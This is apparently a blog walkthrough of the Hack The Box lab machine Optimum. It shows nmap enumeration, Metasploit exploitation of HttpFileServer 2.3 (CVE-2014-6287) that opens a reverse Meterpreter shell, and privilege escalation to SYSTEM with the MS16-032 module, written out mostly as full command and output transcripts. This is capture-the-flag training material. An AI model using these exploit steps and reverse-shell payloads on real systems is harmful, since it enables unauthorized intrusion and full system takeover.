---
title: "Optimum Walkthrough - HTB Easy | HttpFileServer RCE & MS16-032 Privilege Escalation"
description: "Complete walkthrough of Optimum from Hack The Box. A beginner-level machine focusing primarily on service enumeration with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete."
author: dua2z3rr
date: 2025-09-07 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["web-application", "vulnerability-assessment", "injections", "software-and-os-exploitation", "security-tools", "os-command-injection", "python", "hfs"]
image: /assets/img/optimum/optimum-resized.png
---

## Overview

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.

---

## External Enumeration

### Nmap

Let's start with nmap:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.8 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.8 -vv -p 80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key findings:**
- Port 80: **HTTP** running **HttpFileServer httpd 2.3**
- Operating System: **Windows**
- Supported methods: GET, HEAD, POST

---

## Web Application Analysis

### HTTP Service

Let's access port 80:

![Desktop View](/assets/img/optimum/optimum-homepage.png)

We see the possibility to log in to the server. This could be useful in the future, however we don't have credentials.

---

## Exploit Research

### Finding CVE-2014-6287

Let's search for an exploit for `HttpFileServer 2.3`:

![Desktop View](/assets/img/optimum/optimum-hfs-server-exploit.png)

This exploit (CVE-2014-6287) is perfect for our needs. Let's check if it exists in Metasploit:

```shell
[msf](Jobs:0 Agents:0) >> search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >>
```

---

## Initial Access

### Exploit Execution

For now, let's keep the default payload. If the exploit doesn't work, we'll change it:

```shell
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set SRVHOST tun0
SRVHOST => 10.10.16.9
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set SRVPORT 9001
SRVPORT => 9001
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set LHOST tun0
LHOST => 10.10.16.9
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> exploit
[*] Started reverse TCP handler on 10.10.16.9:4444 
[*] Using URL: http://10.10.16.9:9001/PhcbtsAFqV7
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /PhcbtsAFqV7
[*] Sending stage (177734 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\wrWoZcV.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.9:4444 -> 10.10.10.8:49162) at 2025-09-07 17:11:07 +0200
[*] Server stopped.

(Meterpreter 1)(C:\Users\kostas\Desktop) >
```

**User flag obtained.**

---

## Privilege Escalation

### Internal Enumeration

Let's look for ways to become **System**.

We'll start a Metasploit script to search for potential attack vectors to perform privilege escalation:

```shell
(Meterpreter 1)(C:\Users\kostas\Desktop) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> search post/multi/recon

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  post/multi/recon/multiport_egress_traffic  .                normal  No     Generate TCP/UDP Outbound Traffic On Multiple Ports
   1  post/multi/recon/local_exploit_suggester   .                normal  No     Multi Recon Local Exploit Suggester
   2  post/multi/recon/reverse_lookup            .                normal  No     Reverse Lookup IP Addresses
   3  post/multi/recon/sudo_commands             .                normal  No     Sudo Commands


Interact with a module by name or index. For example info 3, use 3 or use post/multi/recon/sudo_commands

[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> use 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.9:4444 -> 10.10.10.8:49162 (10.10.10.8)

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> exploit
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 205 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
```

---

## Root Access via MS16-032

### Exploit Selection

Let's try exploit number 5 (I chose this one because the name contained the words **privilege escalation**):

```shell
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> search exploit/windows/local/ms16_032_secondary_logon_handle_privesc

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank    Check  Description
   -  ----                                                           ---------------  ----    -----  -----------
   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
   1    \_ target: Windows x86                                       .                .       .      .
   2    \_ target: Windows x64                                       .                .       .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.9:4444 -> 10.10.10.8:49162 (10.10.10.8)

[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set LHOST 10.10.16.9
LHOST => 10.10.16.9
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set LHOST tun0
LHOST => 10.10.16.9
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set LPORT 9002
LPORT => 9002
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> exploit
[*] Started reverse TCP handler on 10.10.16.9:9002 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\xEdUWf.ps1...
[*] Compressing script contents...
[+] Compressed size: 3723
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2108

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $uk = [Ntdll]::NtImpersonateThread($dW, $dW, [ref]$fi)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (fi:VariablePath) [], RuntimeE 
   xception
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $uk = [Advapi32]::DuplicateToken($bKU, 2, [ref]$y6Ly)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

eq6GHshQiefIaiXM3do1qe7JosTkPSyP
[+] Executed on target machine.
[*] Sending stage (177734 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.9:9002 -> 10.10.10.8:49164) at 2025-09-07 17:54:04 +0200
[+] Deleted C:\Users\kostas\AppData\Local\Temp\xEdUWf.ps1

(Meterpreter 2)(C:\Users\kostas\Desktop) > getuis
[-] Unknown command: getuis. Did you mean getuid? Run the help command for more details.
(Meterpreter 2)(C:\Users\kostas\Desktop) > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Root flag obtained.** Box completed.

---

## Reflections

### Alternative Approaches

The exploit suggester identified six potentially vulnerable exploits. Any of the other five might have worked as alternative privilege escalation paths, though ms16_032 proved successful.

---

**Completed this box? Which privilege escalation exploit did you use?** Leave a comment down below!
